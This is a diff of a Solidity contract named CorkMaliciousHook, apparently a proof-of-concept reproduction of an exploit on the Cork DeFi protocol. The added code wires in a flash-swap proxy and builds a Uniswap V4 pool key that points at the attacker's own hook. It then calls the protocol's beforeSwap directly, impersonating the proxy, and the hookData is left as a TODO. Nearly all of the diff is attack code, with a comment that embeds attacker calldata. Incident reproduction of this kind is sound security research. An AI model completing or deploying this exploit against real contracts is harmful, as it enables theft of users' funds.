@@ -9,6 +9,7 @@ contract CorkMaliciousHook {
     ICorkHook corkHook;
     IPSMProxy moduleCore;
     IPSMProxy assetFactory;
+    IPSMProxy flashSwapProxy;
 
     IERC20 lpToken;
     IERC20 wstETH;
@@ -40,11 +41,13 @@ contract CorkMaliciousHook {
         IERC20 _etherfiWETH,
         ICorkConfig _corkConfig,
         IUniV4PoolManager _uniV4PoolManager,
-        address _exchangeRateProvider
+        address _exchangeRateProvider,
+        IPSMProxy _flashSwapProxy
     ) {
         corkHook = _corkHook;
         moduleCore = _moduleCore;
         assetFactory = _assetFactory;
+        flashSwapProxy = _flashSwapProxy;
         lpToken = _lpToken;
         wstETH = _wstETH;
         etherfiWETH = _etherfiWETH;
@@ -148,6 +151,10 @@ contract CorkMaliciousHook {
 
         /* Our calldata only differs  in the NEW_PAIR_ID since the MaliciousCorkHook's address is not the same
         0x0000000000000000000000007ea0614072e2107c834365bea14f9b6386fb84a500000000000000000000000051f70fe94e7ccd9f2efe45a4f2ea3a7ae0c62f8c5291badb2bc3a5fd46b91571f3858f63301883f319ae9deb908b0e4f350e6fa80000000000000000000000001d2724ca345e1889cecddefa5f8f83666a442c86
+        
+        However, this is pretty weird as all those addreses could be stored and retrieved directly from the
+        attacker's hook context (this contract)
+
         */
         uniV4PoolManager.unlock(abi.encode(callbackData));
     }
@@ -164,5 +171,30 @@ contract CorkMaliciousHook {
     function unlockCallback(bytes calldata data) external {
         require(msg.sender == address(uniV4PoolManager), "not pool");
         CallbackData memory decodedData = abi.decode(data, (CallbackData));
+
+        (uint256 res8DS2, uint256 res5CT3) = corkHook.getReserves(decodedData.weETH8DS, decodedData.wstETH5CT);
+
+        ICorkHook.MarketSnapshot memory marketSnapshot =
+            corkHook.getMarketSnapshot(decodedData.weETH8DS, decodedData.wstETH5CT);
+
+        uniV4PoolManager.sync(decodedData.wstETH5CT);
+
+        IUniV4PoolManager.PoolKey memory poolKey = IUniV4PoolManager.PoolKey({
+            currency0: decodedData.wstETH5CT,
+            currency1: decodedData.weETH8DS,
+            fee: 0,
+            tickSpacing: 1,
+            hooks: address(this)
+        });
+
+        IUniV4PoolManager.SwapParams memory swapParams = IUniV4PoolManager.SwapParams({
+            zeroForOne: true,
+            amountSpecified: res5CT3 / 10,
+            sqrtPriceLimitX96: 79_228_162_514_264_337_593_543_950_336 // UniV4 SQRT_PRICE_1_1
+        });
+
+        // TODO: Craft hookData that is used then inside flashSwapProxy.CorkCall
+        bytes memory hookData;
+        corkHook.beforeSwap(address(flashSwapProxy), poolKey, swapParams, hookData);
     }
 }
